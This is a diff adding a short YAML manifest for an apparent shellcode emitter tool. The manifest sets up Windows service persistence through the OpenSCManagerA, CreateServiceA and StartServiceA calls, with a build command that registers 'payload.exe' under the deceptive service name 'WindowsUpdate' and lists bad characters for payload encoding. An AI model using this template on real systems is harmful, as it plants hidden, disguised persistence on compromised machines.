@@ -1,0 +1,10 @@
+# Service persistence via SCM (OpenSCManagerA + CreateServiceA + StartServiceA)
+# IR workflow: LoadLibraryA(advapi32) -> OpenSCManagerA -> CreateServiceA (13 args) -> StartServiceA
+# Requires admin/SYSTEM privileges on target.
+#
+# Build:
+#   uv run emitrion emitrion/manifests/win-x86/service_persist.yaml \
+#       --exe-path "C:\Users\Public\payload.exe" \
+#       --service-name "WindowsUpdate" --no-assemble --out emitter_out/
+template: ir_service_persist
+badchars: ["00", "0A", "0D"]
